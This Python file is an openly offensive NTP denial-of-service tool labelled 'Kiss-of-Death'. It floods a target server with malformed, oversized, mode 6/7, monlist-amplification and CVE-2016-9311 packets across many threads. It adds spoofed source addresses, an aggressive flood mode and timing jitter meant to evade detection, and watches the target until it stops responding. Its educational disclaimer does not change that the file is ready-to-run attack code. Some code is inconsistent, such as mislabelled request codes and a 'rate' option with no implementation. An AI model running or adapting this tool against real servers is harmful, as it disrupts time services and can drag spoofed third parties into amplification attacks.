#!/usr/bin/env python3

"""
Enhanced NTP Kiss-of-Death (KoD) Attack Script
For educational and competition use only.

This script demonstrates various NTP KoD techniques with improved effectiveness
against vulnerable NTP server implementations.
"""

import socket
import random
import time
import argparse
import threading
import struct
import sys
from scapy.all import IP, UDP, Raw, send, sniff, sr1

# ANSI color codes for output
class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    ENDC = '\033[0m'

def parse_arguments():
    """Parse command-line arguments"""
    parser = argparse.ArgumentParser(description='Enhanced NTP Kiss-of-Death Attack Demonstration')
    parser.add_argument('--target', type=str, required=True, help='Target NTP server IP')
    parser.add_argument('--port', type=int, default=123, help='Target NTP port (default: 123)')
    parser.add_argument('--threads', type=int, default=8, help='Number of threads to use')
    parser.add_argument('--duration', type=int, default=60, help='Attack duration in seconds')
    parser.add_argument('--technique', type=str, default='all', 
                        choices=['all', 'malformed', 'rate', 'large', 'fragment', 'restrict', 
                                'amplification', 'mode6', 'mode7', 'cve-2016-9311'],
                        help='Attack technique to use')
    parser.add_argument('--intensity', type=int, default=8, choices=range(1, 11),
                        help='Attack intensity (1-10)')
    parser.add_argument('--spoof', action='store_true', help='Enable IP spoofing')
    parser.add_argument('--flood', action='store_true', help='Enable aggressive flooding (caution: high bandwidth usage)')
    parser.add_argument('--analyze', action='store_true', help='Run analysis on target before attack')
    return parser.parse_args()

def get_spoofed_ip():
    """Generate a random IP address for spoofing"""
    # Avoid private IP ranges and other special addresses
    first_octet = random.choice([1, 2, 3, 5, 6, 7, 8, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 27, 28, 29, 30])
    return f"{first_octet}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"

class NTPKoD:
    """Enhanced NTP Kiss-of-Death attack implementation"""
    
    def __init__(self, target, port=123, threads=8, intensity=8, spoof=False, flood=False):
        """Initialize the attack parameters"""
        self.target = target
        self.port = port
        self.threads = threads
        self.intensity = intensity
        self.stop_event = threading.Event()
        self.spoof = spoof
        self.flood = flood
        self.server_version = None
        self.server_impl = None
        self.vulnerabilities = []
        
        # Calculate parameters based on intensity (1-10)
        self.packet_rate = 20 + (intensity * 30)  # packets per second
        self.burst_size = 30 + (intensity * 20)   # packets per burst
        
        if self.flood:
            self.packet_rate *= 5
            self.burst_size *= 3
            
        print(f"{Colors.BLUE}[*] NTP KoD configured for {target}:{port}{Colors.ENDC}")
        print(f"{Colors.BLUE}[*] Using {threads} threads at intensity level {intensity}{Colors.ENDC}")
        print(f"{Colors.BLUE}[*] Packet rate: {self.packet_rate} pps, Burst size: {self.burst_size}{Colors.ENDC}")
        if self.spoof:
            print(f"{Colors.BLUE}[*] IP spoofing enabled{Colors.ENDC}")
        if self.flood:
            print(f"{Colors.RED}[!] WARNING: Aggressive flooding enabled{Colors.ENDC}")
    
    #---------------------------
    # Target Analysis Functions
    #---------------------------
    
    def analyze_target(self):
        """Analyze target NTP server to identify version and implementation"""
        print(f"{Colors.BLUE}[*] Analyzing target NTP server...{Colors.ENDC}")
        
        try:
            # Send standard client query
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(3.0)
            
            # Standard NTPv4 client request
            ntp_request = b'\x23' + b'\x00' * 47
            
            sock.sendto(ntp_request, (self.target, self.port))
            response, _ = sock.recvfrom(1024)
            
            # Extract version info
            if len(response) >= 4:
                header = response[0]
                version = (header & 0x38) >> 3
                mode = header & 0x07
                stratum = response[1]
                
                self.server_version = version
                
                # Try to determine implementation based on response patterns
                ref_id = response[12:16]
                ref_id_str = ''.join(chr(c) if 32 <= c <= 126 else '.' for c in ref_id)
                
                if ref_id_str in ['NTPS', 'NTP4']:
                    self.server_impl = "ntpd"
                elif ref_id_str == 'LOCL':
                    self.server_impl = "Windows NTP"
                elif ref_id_str == 'CHRM':
                    self.server_impl = "Chrony"
                else:
                    self.server_impl = "Unknown"
                
                print(f"{Colors.GREEN}[+] NTP Server detected: Version {version}, Mode {mode}, Stratum {stratum}{Colors.ENDC}")
                print(f"{Colors.GREEN}[+] Reference ID: {ref_id_str}, Likely implementation: {self.server_impl}{Colors.ENDC}")
                
                # Test for specific vulnerabilities
                self.probe_vulnerabilities()
                
            else:
                print(f"{Colors.YELLOW}[!] Received unusual response length: {len(response)}{Colors.ENDC}")
                
        except socket.timeout:
            print(f"{Colors.RED}[!] Timeout while analyzing target{Colors.ENDC}")
        except Exception as e:
            print(f"{Colors.RED}[!] Error analyzing target: {e}{Colors.ENDC}")
        finally:
            sock.close()
    
    def probe_vulnerabilities(self):
        """Probe for specific NTP vulnerabilities"""
        vulnerability_tests = [
            self.test_control_modes,
            self.test_monlist,
            self.test_cve_2016_9311
        ]
        
        for test in vulnerability_tests:
            test()
        
        if self.vulnerabilities:
            print(f"{Colors.GREEN}[+] Detected vulnerabilities: {', '.join(self.vulnerabilities)}{Colors.ENDC}")
        else:
            print(f"{Colors.YELLOW}[!] No specific vulnerabilities detected{Colors.ENDC}")
    
    def test_control_modes(self):
        """Test if server responds to mode 6/7 packets"""
        for mode in [6, 7]:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(2.0)
                
                # Mode 6/7 request with read status
                mode_request = bytearray(12)
                mode_request[0] = (mode & 0x07) | 0x20  # Version 4 + mode
                mode_request[1] = 0x02  # Read status request
                
                sock.sendto(bytes(mode_request), (self.target, self.port))
                response, _ = sock.recvfrom(1024)
                
                if len(response) > 0:
                    resp_mode = response[0] & 0x07
                    if resp_mode == mode:
                        self.vulnerabilities.append(f"mode{mode}-enabled")
                        print(f"{Colors.YELLOW}[!] Server responds to Mode {mode} control messages{Colors.ENDC}")
            except:
                pass
            finally:
                sock.close()
    
    def test_monlist(self):
        """Test for monlist command vulnerability"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2.0)
            
            # Mode 7 monlist request
            monlist_request = bytearray(12)
            monlist_request[0] = 0x17  # Version 2, Mode 7
            monlist_request[1] = 0x32  # REQ_MON_GETLIST_1
            monlist_request[2] = 0x00  # Authentication not used
            
            sock.sendto(bytes(monlist_request), (self.target, self.port))
            response, _ = sock.recvfrom(1024)
            
            if len(response) > 100:
                self.vulnerabilities.append("monlist-amplification")
                print(f"{Colors.YELLOW}[!] Server vulnerable to monlist amplification{Colors.ENDC}")
        except:
            pass
        finally:
            sock.close()
    
    def test_cve_2016_9311(self):
        """Test for CVE-2016-9311 (mode 6 trap info disclosure)"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2.0)
            
            # Crafted packet to test CVE-2016-9311
            cve_request = bytearray(12)
            cve_request[0] = 0x16  # Version 2, Mode 6
            cve_request[1] = 0x02  # READVAR
            cve_request[2] = 0x00  # Sequence
            
            # Add "trap" variable name
            var_name = b'trap\x00'
            full_request = bytes(cve_request) + var_name
            
            sock.sendto(full_request, (self.target, self.port))
            response, _ = sock.recvfrom(1024)
            
            if len(response) > 16 and b'trap=' in response:
                self.vulnerabilities.append("CVE-2016-9311")
                print(f"{Colors.YELLOW}[!] Server vulnerable to CVE-2016-9311{Colors.ENDC}")
        except:
            pass
        finally:
            sock.close()
    
    #---------------------------
    # Packet Creation Functions
    #---------------------------
    
    def create_packet(self, technique):
        """Factory method to create packets based on technique"""
        packet_generators = {
            'malformed': self.create_malformed_packet,
            'large': self.create_large_packet,
            'restrict': self.create_restrict_packet,
            'fragment': self.create_fragmented_header,
            'amplification': self.create_amplification_packet,
            'mode6': self.create_mode6_packet,
            'mode7': self.create_mode7_packet,
            'cve-2016-9311': self.create_cve_2016_9311_packet
        }
        
        if technique == 'all':
            # Randomly select a technique
            technique = random.choice(list(packet_generators.keys()))
            
        return packet_generators.get(technique, self.create_malformed_packet)()
    
    def create_malformed_packet(self):
        """Create a malformed NTP packet that might trigger implementation bugs"""
        # Start with a standard v4 client packet
        data = bytearray(48)
        
        # Mix of different corruption techniques
        corruption_types = [
            self._corrupt_invalid_header,
            self._corrupt_invalid_combination,
            self._corrupt_extreme_timestamp,
            self._corrupt_invalid_mode,
            self._corrupt_extension_fields,
            self._corrupt_extreme_values
        ]
        
        # Select a random corruption technique
        corrupted_data = random.choice(corruption_types)(data)
        return corrupted_data
    
    def _corrupt_invalid_header(self, data):
        """Create packet with completely invalid header byte"""
        data[0] = random.choice([0xFF, 0xDC, 0xAA, 0xFE])
        # Fill with random data
        for i in range(1, 48):
            data[i] = random.randint(0, 255)
        return bytes(data)
    
    def _corrupt_invalid_combination(self, data):
        """Create packet with invalid combination of valid-looking values"""
        data[0] = (random.randint(0, 3) << 6) | (random.randint(4, 7) << 3) | random.randint(0, 7)
        # Invalid stratum
        data[1] = random.choice([0, 17, 254, 255])
        # Invalid poll value
        data[2] = random.randint(250, 255)
        return bytes(data)
    
    def _corrupt_extreme_timestamp(self, data):
        """Create packet with extreme timestamp values"""
        data[0] = 0x23  # Version 4, mode 3
        # Set all timestamp fields to max value
        for i in range(16, 48):
            data[i] = 0xFF
        return bytes(data)
    
    def _corrupt_invalid_mode(self, data):
        """Create packet with valid version but invalid mode"""
        data[0] = 0x20 | random.choice([0, 6, 7])  # Version 4, invalid mode
        # Inconsistent length - make it look like it should be longer
        struct.pack_into('>H', data, 6, 0x0100)  # Extension field length indicator
        return bytes(data)
    
    def _corrupt_extension_fields(self, data):
        """Create packet with potentially problematic extension fields"""
        data[0] = 0x23  # Version 4, client mode
        # Add extension fields that may not be handled correctly
        struct.pack_into('>H', data, 46, 0x0001)  # Extension field present indicator
        return bytes(data)
    
    def _corrupt_extreme_values(self, data):
        """Create packet with extreme/unusual values in valid fields"""
        data[0] = 0x23  # Standard v4 client
        # Set root delay/dispersion to extreme values
        struct.pack_into('>I', data, 4, 0xFFFFFFFF)
        struct.pack_into('>I', data, 8, 0xFFFFFFFF)
        # Origin timestamp with unusual values
        struct.pack_into('>Q', data, 24, 0xFFFFFFFFFFFFFFFF)
        return bytes(data)
    
    def create_large_packet(self):
        """Create an oversized NTP packet"""
        # More aggressive in packet size
        header_size = 48
        # Create a much larger packet - some implementations might crash on large unexpected packets
        extra_size = random.randint(1500, 8192)  # Much larger
        
        header = bytearray(header_size)
        # Set as NTP v4, mode 3 (client)
        header[0] = 0x23
        
        # Add extension fields headers that point to expanded data regions
        struct.pack_into('>H', header, 46, 0xEFFF)  # Extension field type/length
        
        # Create extra data with specially crafted patterns
        pattern_types = [
            self._create_ip_pattern,
            self._create_timestamp_pattern,
            self._create_ntp_header_pattern,
            self._create_random_pattern
        ]
        
        # Select a random pattern type
        extra = pattern_types[random.randint(0, len(pattern_types) - 1)](extra_size)
        
        return bytes(header + extra)
    
    def _create_ip_pattern(self, size):
        """Fill buffer with repeated IP addresses"""
        extra = bytearray(size)
        for i in range(0, size - 4, 4):
            extra[i:i+4] = socket.inet_aton(get_spoofed_ip())
        return extra
    
    def _create_timestamp_pattern(self, size):
        """Fill buffer with timestamp-like values"""
        extra = bytearray(size)
        for i in range(0, size - 8, 8):
            struct.pack_into('>Q', extra, i, random.randint(0, 0xFFFFFFFFFFFFFFFF))
        return extra
    
    def _create_ntp_header_pattern(self, size):
        """Fill buffer with NTP header-like structures"""
        extra = bytearray(size)
        for i in range(0, size - 48, 48):
            extra[i] = 0x23  # Looks like another NTP packet
            # Rest is random
            for j in range(1, 48):
                if i + j < size:
                    extra[i + j] = random.randint(0, 255)
        return extra
    
    def _create_random_pattern(self, size):
        """Fill buffer with random data"""
        extra = bytearray(size)
        for i in range(size):
            extra[i] = random.randint(0, 255)
        return extra
    
    def create_mode6_packet(self):
        """Create a mode 6 control packet"""
        # Mode 6 is used for remote configuration
        data = bytearray(48)
        
        # Set as NTP v4, mode 6
        data[0] = 0x26  # 00100110
        
        # Set operation code - try different operations
        data[1] = random.choice([1, 2, 3, 4, 8, 9, 11])
        
        # Sequence number and status
        data[2] = random.randint(0, 255)  # Sequence
        data[3] = 0  # Status
        
        # Association ID - try various values including 0 (default)
        struct.pack_into('>H', data, 4, random.choice([0, 1, 0xFFFF, random.randint(1, 65534)]))
        
        # Add some data if needed for specific operations
        if data[1] == 2:  # READVAR
            var_names = [
                b'system\x00', 
                b'peer\x00', 
                b'clock\x00', 
                b'trap\x00',  # Associated with CVE-2016-9311
                b'io\x00',
                b'*\x00'      # Request all variables
            ]
            var_name = random.choice(var_names)
            return bytes(data[:12]) + var_name
            
        return bytes(data[:12])  # Mode 6 packets can be short
    
    def create_mode7_packet(self):
        """Create a mode 7 packet (implementation-specific)"""
        # Mode 7 is used for monitoring and querying
        data = bytearray(48)
        
        # Set as NTP v4, mode 7
        data[0] = 0x27  # 00100111
        
        # Set request code - try different codes including potentially vulnerable ones
        request_codes = [
            0x00,  # NULL request
            0x20,  # MON_GETLIST_1 (monlist)
            0x21,  # MON_GETLIST_1 (continued)
            0x2A,  # GET_RESTRICT
            0x2B,  # RESADDFLAGS
            0x2C,  # RESSUBFLAGS
            0x2D,  # UNRESTRICT
            0x2E,  # MON_GETLIST_2
            0x2F,  # MON_GETLIST_2 (continued)
            random.randint(0, 255)  # Random code to test reaction
        ]
        data[1] = random.choice(request_codes)
        
        # Implementation number - 0 for NTPD
        data[2] = 0
        
        # Random sequence number
        data[3] = random.randint(0, 255)
        
        # Status
        data[4] = 0
        
        # Association ID
        data[5] = 0
        
        # If monlist request, set specific format
        if data[1] in [0x20, 0x21, 0x2E, 0x2F]:
            struct.pack_into('>H', data, 6, 0)  # Offset
            struct.pack_into('>H', data, 8, 0)  # Count
            data = data[:12]  # Truncate to correct length for this request
        
        return bytes(data)
    
    def create_cve_2016_9311_packet(self):
        """Create packet to exploit CVE-2016-9311"""
        # This creates a mode 6 READVAR request specifically for the 'trap' variable
        data = bytearray(12)
        
        # Mode 6, version 3
        data[0] = 0x1E  # 00011110
        
        # READVAR operation
        data[1] = 0x02
        
        # Zero sequence and status
        data[2] = 0x00
        data[3] = 0x00
        
        # Association ID 0
        struct.pack_into('>H', data, 4, 0x0000)
        
        # Add "trap" variable name
        var_name = b'trap\x00'
        
        return bytes(data) + var_name
    
    def create_restrict_packet(self):
        """Create a packet that might trigger rate limiting/restriction"""
        restrict_techniques = [
            self._create_unusual_poll_packet,
            self._create_unusual_precision_packet,
            self._create_high_poll_packet,
            self._create_zero_timestamp_packet
        ]
        
        # Select a random restriction technique
        return restrict_techniques[random.randint(0, len(restrict_techniques) - 1)]()
    
    def _create_unusual_poll_packet(self):
        """Create packet with unusual poll intervals"""
        data = bytearray(48)
        data[0] = 0x23  # v4, mode 3
        data[2] = random.choice([0, 1, 2, 18, 19, 20])  # Unusual poll values
        return bytes(data)
    
    def _create_unusual_precision_packet(self):
        """Create packet with unusual precision values"""
        data = bytearray(48)
        data[0] = 0x23  # v4, mode 3
        data[3] = random.randint(200, 255)  # Unusual precision
        return bytes(data)
    
    def _create_high_poll_packet(self):
        """Create packet with extremely high poll value"""
        data = bytearray(48)
        data[0] = 0x23  # v4, mode 3
        data[2] = 0xFF  # Highest poll value
        return bytes(data)
    
    def _create_zero_timestamp_packet(self):
        """Create packet with all timestamp fields set to zero"""
        data = bytearray(48)
        data[0] = 0x23  # v4, mode 3
        # Zero all timestamp fields
        for i in range(16, 48):
            data[i] = 0x00
        return bytes(data)
    
    def create_amplification_packet(self):
        """Create a packet that might trigger amplification responses"""
        amplification_techniques = [
            self._create_monlist_packet,
            self._create_stats_packet,
            self._create_readvar_packet
        ]
        
        # Select a random amplification technique
        return amplification_techniques[random.randint(0, len(amplification_techniques) - 1)]()
    
    def _create_monlist_packet(self):
        """Create classic monlist request packet"""
        data = bytearray(12)
        data[0] = 0x17  # v2, mode 7
        data[1] = 0x32  # REQ_MON_GETLIST_1
        data[2] = 0x00  # Implementation 0
        return bytes(data)
    
    def _create_stats_packet(self):
        """Create mode 7 get stats packet"""
        data = bytearray(12)
        data[0] = 0x27  # v4, mode 7
        data[1] = 0x02  # REQ_STATS
        return bytes(data)
    
    def _create_readvar_packet(self):
        """Create mode 6 READVAR with wildcard packet"""
        data = bytearray(12)
        data[0] = 0x26  # v4, mode 6
        data[1] = 0x02  # READVAR
        return bytes(data) + b'*\x00'  # Request all variables
    
    def create_fragmented_header(self):
        """Create a packet with unusual/fragmented header values"""
        fragmentation_techniques = [
            self._create_odd_version_packet,
            self._create_inconsistent_length_packet,
            self._create_mixed_version_packet,
            self._create_extreme_reference_packet
        ]
        
        # Select a random fragmentation technique
        return fragmentation_techniques[random.randint(0, len(fragmentation_techniques) - 1)]()
    
    def _create_odd_version_packet(self):
        """Create packet with odd version numbers"""
        data = bytearray(48)
        data[0] = (random.choice([1, 5]) << 3) | 0x03  # Unusual version, mode 3
        return bytes(data)
    
    def _create_inconsistent_length_packet(self):
        """Create packet with inconsistent length indicators"""
        data = bytearray(48)
        data[0] = 0x23  # v4, mode 3
        struct.pack_into('>H', data, 6, 0x00FF)  # Strange offset value
        return bytes(data)
    
    def _create_mixed_version_packet(self):
        """Create packet with mix of version 3 and 4 fields"""
        data = bytearray(48)
        data[0] = 0x1B  # v3, mode 3
        # But set some v4-specific fields
        struct.pack_into('>I', data, 44, 0xFFFFFFFF)
        return bytes(data)
    
    def _create_extreme_reference_packet(self):
        """Create packet with extreme reference timestamp"""
        data = bytearray(48)
        data[0] = 0x23  # v4, mode 3
        # Set reference timestamp to odd value
        for i in range(16, 24):
            data[i] = 0xFF
        return bytes(data)
    
    #---------------------------
    # Attack Execution Functions
    #---------------------------
    
    def attack_thread(self, thread_id, technique):
        """Thread function to execute the attack"""
        packets_sent = 0
        start_time = time.time()
        socket_errors = 0
        max_socket_errors = 50  # After this many errors, we'll back off
        
        print(f"{Colors.GREEN}[+] Thread {thread_id} started using technique: {technique}{Colors.ENDC}")
        
        # Choose target-specific techniques if vulnerabilities were detected
        if technique == 'all' and self.vulnerabilities:
            if 'mode6-enabled' in self.vulnerabilities:
                technique_options = ['mode6']
                if 'CVE-2016-9311' in self.vulnerabilities:
                    technique_options.append('cve-2016-9311')
                technique = random.choice(technique_options)
                print(f"{Colors.YELLOW}[!] Thread {thread_id} targeting detected vulnerability: {technique}{Colors.ENDC}")
            elif 'mode7-enabled' in self.vulnerabilities:
                technique = 'mode7'
                print(f"{Colors.YELLOW}[!] Thread {thread_id} targeting detected vulnerability: {technique}{Colors.ENDC}")
            elif 'monlist-amplification' in self.vulnerabilities:
                technique = 'amplification'
                print(f"{Colors.YELLOW}[!] Thread {thread_id} targeting detected vulnerability: {technique}{Colors.ENDC}")
        
        while not self.stop_event.is_set():
            try:
                # Get packet data for the specified technique
                packet_data = self.create_packet(technique)
                
                # Send a burst of packets
                for _ in range(self.burst_size):
                    try:
                        # Create a different source port for each packet
                        src_port = random.randint(10000, 65000)
                        
                        # Use scapy for more control over packet construction
                        if self.spoof:
                            src_ip = get_spoofed_ip()
                            packet = (
                                IP(src=src_ip, dst=self.target) /
                                UDP(sport=src_port, dport=self.port) /
                                Raw(load=packet_data)
                            )
                        else:
                            packet = (
                                IP(dst=self.target) /
                                UDP(sport=src_port, dport=self.port) /
                                Raw(load=packet_data)
                            )
                        
                        # Send with high priority in aggressive mode
                        send(packet, verbose=0)
                        packets_sent += 1
                        
                        # Very minimal delay between packets in a burst
                        if not self.flood and random.random() < 0.1:  # 10% chance of tiny delay
                            time.sleep(random.uniform(0.0001, 0.001))
                            
                    except socket.error as e:
                        socket_errors += 1
                        self._handle_socket_error(thread_id, socket_errors, max_socket_errors, e)
                    except Exception as e:
                        print(f"{Colors.RED}[!] Thread {thread_id}: Error sending packet: {e}{Colors.ENDC}")
                
                # Report progress periodically
                self._report_progress(thread_id, packets_sent, start_time)
                
                # Sleep to maintain the desired packet rate, unless in flood mode
                if not self.flood:
                    # Add jitter to evade pattern detection
                    jitter = random.uniform(0.8, 1.2)
                    time.sleep((1.0 / self.packet_rate) * jitter)
                
            except Exception as e:
                print(f"{Colors.RED}[!] Thread {thread_id} error: {e}{Colors.ENDC}")
                time.sleep(0.5)  # Back off on error
        
        elapsed = time.time() - start_time
        if elapsed > 0:
            print(f"{Colors.GREEN}[+] Thread {thread_id} finished after sending {packets_sent} packets " +
                  f"({packets_sent/elapsed:.2f} pps){Colors.ENDC}")
    
    def _handle_socket_error(self, thread_id, socket_errors, max_socket_errors, e):
        """Handle socket errors with adaptive backoff"""
        if socket_errors > max_socket_errors:
            print(f"{Colors.YELLOW}[!] Thread {thread_id}: Too many socket errors, backing off{Colors.ENDC}")
            time.sleep(1.0)  # Longer backoff
            socket_errors = 0  # Reset counter after backoff
        elif hasattr(e, 'errno') and e.errno == 55:  # No buffer space
            time.sleep(0.1)  # Short backoff
        else:
            if socket_errors % 10 == 0:  # Don't flood console with errors
                print(f"{Colors.RED}[!] Thread {thread_id}: Socket error: {e}{Colors.ENDC}")
            time.sleep(0.01)  # Minimal backoff
    
    def _report_progress(self, thread_id, packets_sent, start_time):
        """Report attack progress periodically"""
        if packets_sent % 500 == 0:
            elapsed = time.time() - start_time
            if elapsed > 0:
                rate = packets_sent / elapsed
                print(f"{Colors.YELLOW}[*] Thread {thread_id}: Sent {packets_sent} packets " +
                      f"({rate:.2f} pps){Colors.ENDC}")
    
    def monitor_target(self):
        """Monitor the target NTP server to detect when it becomes unresponsive"""
        check_interval = 2  # seconds between checks
        consecutive_failures = 0
        last_success = time.time()
        response_times = []
        
        # Standard NTP client request
        ntp_request = b'\x23' + b'\x00' * 47
        
        while not self.stop_event.is_set():
            try:
                # Create UDP socket for NTP
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(1.0)  # Short timeout
                
                # Send NTP request and measure response time
                start_time = time.time()
                sock.sendto(ntp_request, (self.target, self.port))
                
                # Try to receive response
                response, _ = sock.recvfrom(1024)
                response_time = (time.time() - start_time) * 1000  # ms
                
                # If we got here, the server is still responding
                consecutive_failures = 0
                last_success = time.time()
                
                # Track response times to detect degradation
                response_times.append(response_time)
                if len(response_times) > 10:
                    response_times.pop(0)
                
                avg_response = sum(response_times) / len(response_times)
                
                # Check for service degradation
                if avg_response > 500:  # More than 500ms average
                    print(f"{Colors.YELLOW}[!] NTP service is degraded! " +
                          f"Response time: {avg_response:.1f}ms{Colors.ENDC}")
                else:
                    print(f"{Colors.GREEN}[+] NTP service is responsive " +
                          f"(Response time: {response_time:.1f}ms){Colors.ENDC}")
                
            except socket.timeout:
                # No response received
                consecutive_failures += 1
                downtime = time.time() - last_success
                
                if consecutive_failures >= 3:
                    print(f"{Colors.RED}[!] NTP service appears to be DOWN! " +
                          f"(No response for {downtime:.1f}s){Colors.ENDC}")
                else:
                    print(f"{Colors.YELLOW}[!] NTP service timeout " +
                          f"({consecutive_failures}/3 consecutive failures){Colors.ENDC}")
                    
            except Exception as e:
                print(f"{Colors.RED}[!] Error monitoring NTP service: {e}{Colors.ENDC}")
            
            finally:
                sock.close()
                time.sleep(check_interval)
    
    def run(self, technique='all', duration=60, analyze=False):
        """Run the KoD attack with the specified technique"""
        print(f"{Colors.BLUE}[*] Starting NTP KoD attack on {self.target}:{self.port}{Colors.ENDC}")
        print(f"{Colors.BLUE}[*] Attack technique: {technique}, Duration: {duration}s{Colors.ENDC}")
        
        # Reset the stop event
        self.stop_event.clear()
        
        # Analyze target if requested
        if analyze:
            self.analyze_target()
        
        # Create threads based on selected technique
        threads = []
        
        if technique == 'all':
            # Use all techniques, distributed across threads
            techniques = ['malformed', 'rate', 'large', 'fragment', 'restrict', 
                         'amplification', 'mode6', 'mode7']
            
            # If CVE-2016-9311 vulnerability was detected, add it to the mix
            if 'CVE-2016-9311' in self.vulnerabilities:
                techniques.append('cve-2016-9311')
            
            for i in range(self.threads):
                # Assign techniques in round-robin fashion
                t = threading.Thread(
                    target=self.attack_thread,
                    args=(i+1, techniques[i % len(techniques)])
                )
                threads.append(t)
                t.start()
        else:
            # Use the specified technique for all threads
            for i in range(self.threads):
                t = threading.Thread(
                    target=self.attack_thread,
                    args=(i+1, technique)
                )
                threads.append(t)
                t.start()
        
        # Monitor the NTP service to detect when it goes down
        monitor_thread = threading.Thread(target=self.monitor_target)
        monitor_thread.start()
        
        try:
            # Run for the specified duration
            time.sleep(duration)
        except KeyboardInterrupt:
            print(f"{Colors.YELLOW}[!] Attack interrupted by user{Colors.ENDC}")
        
        # Stop all threads
        print(f"{Colors.BLUE}[*] Stopping attack...{Colors.ENDC}")
        self.stop_event.set()
        
        # Wait for all threads to finish
        for t in threads:
            t.join()
        
        # Stop the monitor thread
        monitor_thread.join(timeout=2)
        
        print(f"{Colors.GREEN}[+] NTP KoD attack completed{Colors.ENDC}")


def print_banner():
    """Print script banner"""
    banner = """
    ╔═╗╔╦╗╔═╗  ╦╔═╦╔═╗╔═╗  ╔═╗╔═╗  ╔╦╗╔═╗╔═╗╔╦╗╦ ╦
    ║╣ ║║║╠═╝  ╠╩╗║╚═╗╚═╗  ║ ║╠╣    ║║║╣ ╠═╣ ║ ╠═╣
    ╚═╝╩ ╩╩    ╩ ╩╩╚═╝╚═╝  ╚═╝╚    ═╩╝╚═╝╩ ╩ ╩ ╩ ╩
    
    Enhanced NTP Kiss-of-Death Attack Tool - v2.0
    For cybersecurity competitions and educational use only
    """
    print(f"{Colors.RED}{banner}{Colors.ENDC}")


def print_disclaimer():
    """Print legal disclaimer"""
    disclaimer = """
    !!! LEGAL DISCLAIMER !!!
    
    This tool is provided for EDUCATIONAL PURPOSES ONLY to demonstrate
    potential vulnerabilities in NTP implementations. Using this tool
    against any targets without EXPLICIT AUTHORIZATION is ILLEGAL.
    
    Use only in authorized cybersecurity competitions or controlled lab
    environments where explicit permission has been granted.
    
    The author accepts no liability for misuse or damage caused by this tool.
    """
    print(f"{Colors.YELLOW}{disclaimer}{Colors.ENDC}")


def check_root():
    """Check if script is running with root/admin privileges"""
    if sys.platform.startswith('win'):
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False
    else:
        return os.geteuid() == 0


def main():
    """Main function"""
    print_banner()
    print_disclaimer()
    
    # Check for root/admin privileges
    if not check_root():
        print(f"{Colors.RED}[!] This script requires root/administrator privileges to run properly{Colors.ENDC}")
        print(f"{Colors.RED}[!] Please restart with appropriate privileges{Colors.ENDC}")
        return
    
    # Parse command-line arguments
    args = parse_arguments()
    
    # Validate target IP
    try:
        socket.inet_aton(args.target)
    except socket.error:
        print(f"{Colors.RED}[!] Invalid target IP: {args.target}{Colors.ENDC}")
        return
    
    # Confirm the user wants to continue
    print("\nWARNING: This will attempt to disrupt the NTP service. Continue?")
    confirmation = input("Type 'YES' to confirm: ")
    if confirmation != "YES":
        print(f"{Colors.YELLOW}[*] Attack aborted by user{Colors.ENDC}")
        return
    
    # Create and run the KoD attack
    kod = NTPKoD(
        target=args.target,
        port=args.port,
        threads=args.threads,
        intensity=args.intensity,
        spoof=args.spoof,
        flood=args.flood
    )
    
    kod.run(technique=args.technique, duration=args.duration, analyze=args.analyze)


if __name__ == "__main__":
    try:
        # Import os for root check
        import os
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Script terminated by user{Colors.ENDC}")
    except Exception as e:
        print(f"\n{Colors.RED}[!] Unhandled error: {e}{Colors.ENDC}")
